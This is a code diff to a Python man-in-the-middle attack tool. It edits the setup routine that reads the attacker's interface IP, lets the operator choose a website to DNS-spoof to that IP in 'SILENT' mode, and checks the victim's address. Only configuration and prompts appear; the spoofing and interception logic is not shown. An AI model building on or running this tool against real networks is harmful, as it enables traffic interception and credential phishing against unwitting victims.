@@ -15,7 +15,6 @@ import argparse
 import ipaddress
 
 # CONFIGURATION (ATTACKER MUST SET THESE)
-# NOTE: In a fully-fledged tool, these will be overwritten by argparse flags.
 CONFIG = {
     # Network Settings
     "ATTACKER_IP": None,
@@ -29,9 +28,7 @@ CONFIG = {
 }
 
 # DNS Spoofing Map (Used primarily in SILENT mode)
-SPOOF_MAP = {
-    "www.fakelogin.net.": CONFIG["ATTACKER_IP"],
-}
+SPOOF_MAP = {}
 
 # GLOBAL VARIABLES FOR NETWORK STATE
 VICTIM_MAC = None
@@ -619,26 +616,15 @@ def setup_and_run():
     args = parser.parse_args()
 
     # Process --interface
-    CONFIG["INTERFACE"] = args.interface
+    CONFIG['INTERFACE'] = args.interface
     CONFIG['ATTACKER_IP'] = get_if_addr(CONFIG['INTERFACE'])
 
     # Process --mode
     CONFIG['MODE'] = args.mode
     if args.mode == "SILENT":
-        map_set = False
-        while not map_set:
-            print("[SETUP] You have selected silent mode. What website do you want to spoof?")
-            website = input()
-            print(f"[SETUP] Is {website} correct? Y/n")
-            answer = input()
-            if answer in ["Y", "y", "Yes", "yes"]:
-                print(f"[SETUP] Spoofing map set to {website}.")
-                SPOOF_MAP[website] = CONFIG['ATTACKER_IP']
-                map_set = True
-            elif answer in ["N", "n", "No", "no"]:
-                continue
-            else:
-                print("[SETUP] Answer not recognised. Try again.")
+        print("[SETUP] You have selected silent mode. What website do you want to spoof?")
+        website = input()
+        SPOOF_MAP[website] = CONFIG['ATTACKER_IP']
     
     # Process --target
     # Check what network the attacker is in
@@ -656,7 +642,6 @@ def setup_and_run():
     except ValueError:
         print("[SETUP] The given IP address is not of a valid format. Exiting.")
         sys.exit(1)
-
 
     print(f"[SETUP] Starting MITM Attack [{CONFIG['MODE']} MODE] on Victim: {CONFIG['VICTIM_IP']}")
 
